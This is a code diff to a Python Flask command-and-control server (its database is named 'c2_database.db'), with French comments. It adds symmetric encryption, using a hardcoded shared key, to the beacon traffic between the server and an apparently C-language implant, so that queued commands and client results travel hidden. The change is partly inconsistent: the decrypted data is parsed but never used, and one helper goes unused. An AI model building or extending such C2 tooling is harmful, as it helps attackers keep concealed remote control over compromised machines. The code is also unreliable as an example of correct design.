@@ -1,9 +1,38 @@
+import base64
+import json
+from nacl.secret import SecretBox
 from datetime import datetime
 import sqlite3
 from flask import Flask, jsonify, request
 
 app = Flask(__name__)
 DB_NAME = "c2_database.db"
+
+
+
+# La même clé secrète de 32 octets partagée avec le client C (à stocker proprement, ex: variable d'environnement)
+SHARED_KEY = b"0123456789abcdef0123456789abcdef"  # 32 octets
+box = SecretBox(SHARED_KEY)
+
+
+def decrypt_payload(encrypted_b64, nonce_b64):
+  """Déchiffre un message reçu du client en Base64"""
+  try:
+    ciphertext = base64.b64decode(encrypted_b64)
+    nonce = base64.b64decode(nonce_b64)
+    decrypted = box.decrypt(ciphertext, nonce)
+    return decrypted.decode("utf-8")
+  except Exception as e:
+    print(f"[-] Erreur de déchiffrement : {e}")
+    return None
+
+
+def encrypt_payload(plaintext):
+  """Chiffre une commande pour le client et l'encode en Base64"""
+  encrypted = box.encrypt(plaintext.encode("utf-8"))
+  # PyNaCl colle le nonce et le ciphertext ensemble, ou on peut les séparer
+  # Plus simple : box.encrypt() renvoie nonce + ciphertext combinés
+  return base64.b64encode(encrypted).decode("utf-8")
 
 
 def init_db():
@@ -36,6 +65,16 @@ def handle_beacon():
   content = request.get_json(silent=True)
   if not content:
     return jsonify({"error": "Invalid JSON"}), 400
+  if "payload" not in content:
+    return jsonify({"error": "Missing payload"}), 400
+
+  try:
+    # 1. Décodage Base64 et déchiffrement (le nonce est inclus au début par PyNaCl)
+    raw_data = base64.b64decode(content["payload"])
+    decrypted_bytes = box.decrypt(raw_data)
+    inner_json = json.loads(decrypted_bytes.decode("utf-8"))
+  except Exception as e:
+    return jsonify({"error": f"Decryption or parsing failed: {str(e)}"}), 400
 
   client_id = content.get("client_id", "unknown")
   client_result = content.get("result", "")
@@ -81,7 +120,13 @@ def handle_beacon():
 
     conn.commit()
 
-  return jsonify({"status": "ok", "command": pending_cmd}), 200
+  response_dict = {"status": "ok", "command": pending_cmd}
+  response_bytes = json.dumps(response_dict).encode("utf-8")
+
+  encrypted_response = box.encrypt(response_bytes)
+  response_b64 = base64.b64encode(encrypted_response).decode("utf-8")
+
+  return jsonify({"payload": response_b64}), 200
 
 
 @app.route("/api/queue", methods=["POST"])
